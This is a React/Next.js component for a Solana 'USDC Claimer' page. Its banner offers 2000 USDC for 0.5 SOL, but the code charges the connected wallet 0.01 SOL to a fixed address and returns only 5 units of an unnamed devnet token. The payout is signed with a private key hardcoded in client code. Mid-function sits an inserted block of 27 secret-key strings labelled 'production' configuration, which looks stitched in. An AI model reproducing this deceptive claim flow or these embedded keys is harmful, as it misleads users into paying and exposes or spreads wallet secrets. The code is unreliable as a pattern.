/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4Gpc8ZDtYrfRUjDnwL3RjjTNQ5tZ7hi3G577MMfsddHrqCfeXyQebGN6xF7JzFrDdDM6WdYGzjpLCs7nhna1vVwg"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "66MKFy2YW4odVgWnWsWwsSM145xr52svr4E3Md2kYqiVRtKUSqgF9mbcnVxByT5nxJM9Y9DNGoS7ayu1LrmLK7Fy",
  "key1": "Nnj2HQJh3Fg8EEgZ8oAZQFEPyotn9wis67GiTangf9ZAtyPVBFP3Qgnr6wXCGK97MNWcAe6PT9EezF1vSf6s9nv",
  "key2": "5qnKDDCQmbXQXSTmuJ5qydaAchsL532tUNbjk9DJRQfsDXQKtbqVbZ42WkYkCuYHtE8urfxAfQFLJwR9vPAujuaE",
  "key3": "43pKumuYTZgBtnsb7vLGSjH2AjedfvVxN7okxUainrArMwVmFcWcpGwmNPbV4rvkroJQSCKgzUcHPBGS2NTkVddh",
  "key4": "4BBJHciqTLWcpBBdgbLVMkapzdjdfCwRchGy5GLyGpuKQbXHehwPgFbn1pbjntTLUwocgKCfJembWqUkLBNFwgPm",
  "key5": "5VygTqQdwkLCw7f1i6bFr8HaPQctaRWWA2yma6E7HH44mHXbXnqF325NKBm93fnfP7DZCjcz8Gx9xivfg48MSwSH",
  "key6": "28CaXidSTarKikpWVGmD6sNAzNiosgifQiSkyzZWAsTpniD8Lamn3rvwa7H2RwWZs5UpbpsrdLM4nv5adR7kpW91",
  "key7": "5wETFRtE9ksNK91mNnY9uBAJnv5UvP2Keyucx5ysGozfEkn7NS4dgLKmTgfAg7bHL6g21eNFZaMNCJHSmJFK3U5q",
  "key8": "4wQ1av4umPaPPLbm2eYjL3ARoqnxpZeX5tuuA8jcynDeCtzs4AFhYSEZDnGNnGBki78qdzNUWS4aEkGwKLBNsZj4",
  "key9": "4NdnBctFPSn2UVyH3WzrxKVwe4shNe2qbQ88i62hVLruvWSGGdcPLkDGnocuyNV1pPEtjDveF12UNPDGeKt4oh2i",
  "key10": "4iwvXDvA5vPy13QgrBk6oxKBhRFe9tSEQ4tyedcjsMUmvxnEAPChRRPF7Qu7giUApig5n43kPXvXjnApaDkvYUbH",
  "key11": "4Yas7prcTCKYayktG5AoQbfusCXF8XgXoEEf8b966hGhXrrv1zMMmGUxHSkvAGqTCkcctKDUUbrerbBgCrNZhfFz",
  "key12": "2CXiSt31rdgBpzEzXJiWTHndp6mXvCF98uksxD1gt491oUYuYp3TMJB5FGRripXZrNMaPKMJbPbWLq3kTqf8T4Jo",
  "key13": "76HRRQZuMVUMAbXgz7r1MnsMWCGQchDvv2q2B9Fh6TmkmwD3yFdviAbQfdphCdSp8qtaUsctmBVjC5xYQFYcNWX",
  "key14": "63pWCyfghd5wRUxErvRarXZVd58KXrC1rbjr53wmjBM5ymKo338r3ewHzxHGinp3t5yCBXnVBNw9SzXoJWystjTo",
  "key15": "63gd98bJ1fNVfpBB7j6NUw4PcGJqwJ5wiuhPu54Ns2jTSEFHXwFgHm6FFUGiijQ4tBYrHtYn81FQjWK63fG5nq8c",
  "key16": "rgpXxQGhT5gxwioke2rGCq92DjBh4SSp7fEhp87ggDtzXSEcRRVDZ6XGk8PmFWHF7BDQvU7mNdy7cyWoRkTNEbU",
  "key17": "46zzrS1GxTL6ksJCXye5M6GheEmHJNo3iuqDDKzJ6UEuVgFAJreevQZLeqf38DxCtDLvKqMJEojS6hM8nKE6xi53",
  "key18": "64koeSizK1zjBrBXsFtBLb5yGkriZjh9NqAEtN4HuuUjoHyaQgKR4HrRWWQeWh3Si75KGBjMtFoFLhhfHGRxPevq",
  "key19": "3U2wmBHPymbYkEYKwfN6zv5ZzjPgHLxkn9HC7vse4VqQRXMXqUxePVChYQr7ASKBQ7YbNjsPnbee4fHd8nKTYPp6",
  "key20": "4BbPwJ1hoD1uEqMSnqRt3KHdqFfxmexuUvLLviKMNx9ETWL2aoF9jHL9HETVdjxPzgvfjRE66KfameqDx6ki72jB",
  "key21": "4uT5gSYZxnn5teecaNb5U2KbnQRhfUMpX5WwikjeqULnYyvu5CSEUMFCMwMTqJjoNcPQxZjHK3XeCorbh5W19K8Z",
  "key22": "3unzGhJFofiawMXPph1zjn5BmVD8TrUUZwmvFqRKniMTVnn3CLZoH677Nt2QjBeF6eTeFtWsXMjRzQfgPMk9zwR3",
  "key23": "2ZRbLfTprn6HAhZHPwc7XMjznNYtAKLDCtod9zRf3FoGY1DTEm9Y5RfCBYqu9oUb6bwiQEWmrDcL8wHk7N6iwziX",
  "key24": "5TavUFi14phNAL8NKNqvA8g1Mp94PLU7N3Jad1iPSqNBTVhBga9Vt2yZxrNuxrDvzSKEnMsoJBKjeRbKSE3Vkp9k",
  "key25": "wQC4JkrzSaxDa6xqah5BgDXzDiaBFMjpbDKTSACUvFpCXNnGnRBs5aEHPTJtkyEinXMTLjngs9tbLCjKKod1XCK",
  "key26": "2A3zhCgv7ZbdByPob6mgLEV1eYUj6DJVjFM8vD3Y5Y7WooN6UchCRXyaE9AEhix8nMyRZZnrehyVk6nvUpsyvzrg"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
